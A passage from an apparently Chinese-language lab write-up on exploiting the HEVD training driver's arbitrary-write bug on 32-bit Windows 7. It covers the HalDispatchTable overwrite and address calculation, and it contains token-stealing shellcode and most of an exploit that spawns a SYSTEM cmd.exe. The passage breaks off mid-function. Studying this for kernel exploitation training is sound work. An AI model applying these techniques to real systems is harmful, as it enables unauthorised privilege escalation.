</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">,</span> <span class="n">Buffer</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">recvBuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>exp的话：</p>
<div class="highlight" id="id-49"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">what</span> <span class="o">-&gt;</span> <span class="o">&amp;</span><span class="n">payload</span>
</span></span><span class="line"><span class="cl"><span class="n">where</span> <span class="o">-&gt;</span> <span class="n">HalDispatchTable</span><span class="o">+</span><span class="mh">0x4</span></span></span></code></pre></div><p>windbg：</p>
<div class="highlight" id="id-50"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">****** HEVD_IOCTL_ARBITRARY_WRITE ******
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> UserWriteWhatWhere: 0x004B2E60
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> WRITE_WHAT_WHERE Size: 0x8
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> UserWriteWhatWhere-&gt;What: 0x41414141
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> UserWriteWhatWhere-&gt;Where: 0x41414141
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Triggering Arbitrary Write
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Exception Code: 0xC0000005
</span></span><span class="line"><span class="cl">****** HEVD_IOCTL_ARBITRARY_WRITE ******</span></span></code></pre></div><p>可以看到成功控制了What和where</p>
<h3 id="内核提权haldispatchtable" class="heading-element">
  <a href="#%e5%86%85%e6%a0%b8%e6%8f%90%e6%9d%83haldispatchtable" class="heading-mark"></a>内核提权–HalDispatchTable</h3><p>有一个未文档化的函数 <code>NtQueryIntervalProfile</code>，调用了 <code>KeQueryIntervalProfile</code> 函数，<code>KeQueryIntervalProfile</code>会执行这么一段汇编代码 <code>call [HalDispatchTable+0x4]</code>，并且对于 <code>[HalDispatchTable+0x4]</code> 的修改不会破坏系统的稳定性</p>
<div class="highlight" id="id-51"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">uf</span> <span class="no">nt</span><span class="p">!</span><span class="no">KeQueryIntervalProfile</span><span class="err">+</span><span class="mi">0x14</span>
</span></span><span class="line"><span class="cl"><span class="nf">nt</span><span class="p">!</span><span class="no">KeQueryIntervalProfile</span><span class="err">+</span><span class="mi">0x14</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df60e</span> <span class="mi">8945</span><span class="no">f0</span>          <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-10h</span><span class="p">],</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df611</span> <span class="mi">8</span><span class="no">d45fc</span>          <span class="no">lea</span>     <span class="no">eax</span><span class="p">,[</span><span class="no">ebp-4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df614</span> <span class="mi">50</span>              <span class="no">push</span>    <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df615</span> <span class="mi">8</span><span class="no">d45f0</span>          <span class="no">lea</span>     <span class="no">eax</span><span class="p">,[</span><span class="no">ebp-10h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df618</span> <span class="mi">50</span>              <span class="no">push</span>    <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df619</span> <span class="mi">6</span><span class="no">a0c</span>            <span class="no">push</span>    <span class="mi">0</span><span class="no">Ch</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df61b</span> <span class="mi">6</span><span class="no">a01</span>            <span class="no">push</span>    <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df61d</span> <span class="no">ff155cf3f383</span>    <span class="no">call</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">nt</span><span class="p">!</span><span class="no">HalDispatchTable</span><span class="err">+</span><span class="mi">0x4</span> <span class="p">(</span><span class="mi">83</span><span class="no">f3f35c</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df623</span> <span class="mi">85</span><span class="no">c0</span>            <span class="no">test</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="err">840</span><span class="nf">df625</span> <span class="mi">7</span><span class="no">c0b</span>            <span class="no">jl</span>      <span class="no">nt</span><span class="p">!</span><span class="no">KeQueryIntervalProfile</span><span class="err">+</span><span class="mi">0x38</span> <span class="p">(</span><span class="mi">840</span><span class="no">df632</span><span class="p">)</span>  <span class="no">Branch</span></span></span></code></pre></div><p><code>HalDispatchTable</code>是内核中的一个系统调用表，当获得任意地址写的能力之后，可以使用<code>shellcode</code>地址覆盖<code>HalDispatchTable</code>第二个成员处的<code>HalQuerySystemInformation</code>函数地址</p>
<p><code>HalDispatchTable</code>这个内核服务函数指针表，结构如下：</p>
<div class="highlight" id="id-52"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HAL_DISPATCH</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">HAL_DISPATCH_VERSION</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalQuerySystemInformation</span><span class="p">,</span><span class="c1">//此处
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">xHalSetSystemInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalQueryBusSlots</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalDeviceControl</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalExamineMBR</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalIoAssignDriveLetters</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalIoReadPartitionTable</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalIoSetPartitionInformation</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalIoWritePartitionTable</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">xHalHandlerForBus</span><span class="p">,</span>                  <span class="c1">// HalReferenceHandlerByBus
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">xHalReferenceHandler</span><span class="p">,</span>               <span class="c1">// HalReferenceBusHandler
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">xHalReferenceHandler</span>                <span class="c1">// HalDereferenceBusHandler
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">};</span></span></span></code></pre></div><p>所以接下来要做的就是：找到<code>HalDispatchTable</code>地址并覆盖第二个值， 之后调用<code>NtQueryIntervalProfile</code>执行shellcode</p>
<p><code>HalDispatchTable</code>是由内核模块导出的。要得到 <code>HalDispatchTable</code>在内核中的准确地址，首先要得到内核下<code>ntkrnlpa.exe</code>模块的基址，再加上用户态下<code>HalDispatchTable</code>与用户态下<code>ntkrnlpa.exe</code>模块基址二者计算得出的偏移量即可得到内核下 <code>HalDispatchTable</code> 的地址，其中<code>HalDispatchTable+0x4</code>即可得到 <code>xHalQuerySystemInformation</code>函数地址。</p>
<p>流程：</p>
<ol>
<li>使用 <code>EnumDeviceDrivers</code> 来获取 <code>ntkrnlpa.exe</code> 在内核中的基地址</li>
<li>使用 <code>LoadLibrary</code> 将 <code>ntkrnlpa.exe</code> 加载到用户空间中并得到它的基地址</li>
<li>使用 <code>GetProcAddress</code> 来得到 <code>HalDispatchTable</code> 在用户空间中的地址</li>
<li>计算出 <code>HalDispatchTable</code> 与 <code>ntkrnlpa.exe</code> 的基地址的差值</li>
<li>将这个差值加到 <code>ntkrnlpa.exe</code> 在内核中的基地址上得到 <code>HalDispatchTable</code> 在内核中的地址</li>
</ol>
<p>获取<code>ntkrnlpa.exe</code> 在内核中的基地址,文件头<code>Psapi.h</code></p>
<div class="highlight" id="id-53"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">LPVOID</span> <span class="nf">NtkrnlpaBase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">lpcbNeeded</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">TCHAR</span> <span class="n">lpfileName</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Retrieves the load address for each device driver in the system
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//Retrieves the base name of the specified device driver
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">lpfileName</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">lpfileName</span><span class="p">,</span> <span class="s">&#34;ntkrnlpa.exe&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]success to get %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">lpfileName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">lpImageBase</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>ntkrnlpa.exe 在 user mode 中的基地址：</p>
<div class="highlight" id="id-54"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HMODULE</span> <span class="n">hUserSpaceBase</span> <span class="o">=</span> <span class="nf">LoadLibrary</span><span class="p">(</span><span class="s">&#34;ntkrnlpa.exe&#34;</span><span class="p">);</span></span></span></code></pre></div><p>HalDispatchTable 在 user mode 中的地址：</p>
<div class="highlight" id="id-55"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="n">pUserSpaceAddress</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">hUserSpaceBase</span><span class="p">,</span> <span class="s">&#34;HalDispatchTable&#34;</span><span class="p">);</span></span></span></code></pre></div><p>计算 HalDispatchTable+0x4 的地址</p>
<div class="highlight" id="id-56"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">DWORD32</span> <span class="n">hal_4</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">pNtkrnlpaBase</span> <span class="o">+</span> <span class="p">((</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">pUserSpaceAddress</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">hUserSpaceBase</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">;</span></span></span></code></pre></div><h3 id="exp" class="heading-element">
  <a href="#exp" class="heading-mark"></a>EXP</h3><p>由于没有恢复<code>xHalQuerySystemInformation</code>初始环境，所以一旦利用了关机就会蓝屏，可以保存下原来<code>xHalQuerySystemInformation</code>的值，之后填回去</p>
<p>完整Exp：</p>
<div class="highlight" id="id-57"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Psapi.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;profileapi.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##define Write_What_Where 0x22200B </span><span class="c1">// 这个是进入TriggerArbitraryWrite的IoControlCode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_WRITE_WHAT_WHERE</span> <span class="c1">// 定义载入到驱动文件的结构体
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">What</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">Where</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">WRITE_WHAT_WHERE</span><span class="p">,</span> <span class="o">*</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">NTSTATUS</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">NtQueryIntervalProfile_t</span><span class="p">)(</span> <span class="c1">// 这个是函数NtQueryIntervalProfile专属的结构体
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">IN</span> <span class="n">ULONG</span> <span class="n">ProfileSource</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">Interval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">ShellCode</span><span class="p">()</span> <span class="c1">// 将SYSTEM进程的Token覆盖本进程Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">__asm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">pushad</span><span class="p">;</span> <span class="err">保存各寄存器数据</span>
</span></span><span class="line"><span class="cl">		<span class="p">;</span> <span class="n">start</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">xor</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="n">eax设置为0</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">124</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KPCR</span><span class="p">.</span><span class="n">PcrbData</span><span class="p">.</span><span class="n">CurrentThread</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mo">050</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_KTHREAD</span><span class="p">.</span><span class="n">ApcState</span><span class="p">.</span><span class="n">Process</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">eax</span><span class="p">;</span> <span class="err">将本进程</span><span class="n">EPROCESS地址复制到ecx</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="mi">4</span><span class="p">;</span> <span class="n">WIN</span> <span class="mi">7</span> <span class="n">SP1</span> <span class="n">SYSTEM</span> <span class="n">process</span> <span class="n">PID</span> <span class="o">=</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b8h</span><span class="p">];</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">ActiveProcessLinks</span><span class="p">.</span><span class="n">Flink</span>
</span></span><span class="line"><span class="cl">			<span class="n">sub</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="n">b8h</span>
</span></span><span class="line"><span class="cl">			<span class="n">cmp</span><span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mi">0</span><span class="n">b4h</span><span class="p">],</span> <span class="n">edx</span><span class="p">;</span> <span class="err">获取</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">UniqueProcessId</span>
</span></span><span class="line"><span class="cl">			<span class="n">jne</span> <span class="n">SearchSystemPID</span><span class="p">;</span> <span class="err">循环检测是否是</span><span class="n">SYSTEM进程PID</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">];</span> <span class="err">获取</span><span class="n">System进程的Token</span>
</span></span><span class="line"><span class="cl">			<span class="n">mov</span><span class="p">[</span><span class="n">ecx</span> <span class="o">+</span> <span class="mf">0f</span><span class="mi">8</span><span class="n">h</span><span class="p">],</span> <span class="n">edx</span><span class="p">;</span> <span class="err">将本进程</span><span class="n">Token替换为SYSTEM进程</span> <span class="n">nt</span><span class="o">!</span><span class="n">_EPROCESS</span><span class="p">.</span><span class="n">Token</span>
</span></span><span class="line"><span class="cl">			<span class="p">;</span> <span class="n">End</span> <span class="n">of</span> <span class="n">Token</span> <span class="n">Stealing</span> <span class="n">Stub</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="n">popad</span><span class="p">;</span> <span class="err">恢复各个寄存器数据</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// 启动一个使用本进程Token的CMD
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="n">VOID</span> <span class="nf">CreateCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span><span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)};</span>
</span></span><span class="line"><span class="cl">    <span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">LPVOID</span> <span class="nf">NtkrnlpaBase</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LPVOID</span> <span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span> <span class="c1">// 驱动基地址数组
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">DWORD</span> <span class="n">lpcbNeeded</span><span class="p">;</span>         <span class="c1">// lpImageBase[]返回的字节数
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">TCHAR</span> <span class="n">lpfileName</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>   <span class="c1">// 驱动名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nf">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span> <span class="c1">// 获取每个驱动进程的基地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// Retrieves the base name of the specified device driver
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="p">(</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">lpfileName</span><span class="p">,</span> <span class="mi">48</span><span class="p">);</span> <span class="c1">// 根据每个驱动列表列出对应的驱动名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">lpfileName</span><span class="p">,</span> <span class="s">&#34;ntkrnlpa.exe&#34;</span><span class="p">))</span> <span class="c1">// 判断是否找到ntkrnlpa.exe
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]success to get %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">lpfileName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">lpImageBase</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="c1">// 将ntkrnlpa.exe驱动进程的基地址返回
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DWORD32</span> <span class="nf">GetHalOffset_4</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ntkrnlpa.exe in kernel space base address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">PVOID</span> <span class="n">pNtkrnlpaBase</span> <span class="o">=</span> <span class="nf">NtkrnlpaBase</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]ntkrnlpa base address is 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pNtkrnlpaBase</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">HMODULE</span> <span class="n">hUserSpaceBase</span> <span class="o">=</span> <span class="nf">LoadLibraryA</span><span class="p">(</span><span class="s">&#34;ntkrnlpa.exe&#34;</span><span class="p">);</span> <span class="c1">// 获取ntkrnlpa.exe在用户层的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">pUserSpaceAddress</span> <span class="o">=</span> <span class="nf">GetProcAddress</span><span class="p">(</span><span class="n">hUserSpaceBase</span><span class="p">,</span> <span class="s">&#34;HalDispatchTable&#34;</span><span class="p">);</span>   <span class="c1">// 找到用户层下的ntkrnlpa.exe中HalDispatchTable的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">DWORD32</span> <span class="n">UserSpaceoffset</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">pUserSpaceAddress</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">hUserSpaceBase</span><span class="p">;</span> <span class="c1">// 通过获取到的用户层ntkrnlpa.exe基址和HalDispatchTable地址获取到偏移量
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">DWORD32</span> <span class="n">hal_4</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">pNtkrnlpaBase</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">UserSpaceoffset</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">;</span>        <span class="c1">// 找到HalDispatchTable+0x4在内核空间中的地址
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+]HalDispatchTable+0x4 is 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hal_4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">DWORD32</span><span class="p">)</span><span class="n">hal_4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">Trigger_shellcode</span><span class="p">(</span><span class="n">DWORD32</span> <span class="n">where</span><span class="p">,</span> <span class="n">DWORD32</span> <span class="n">what</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
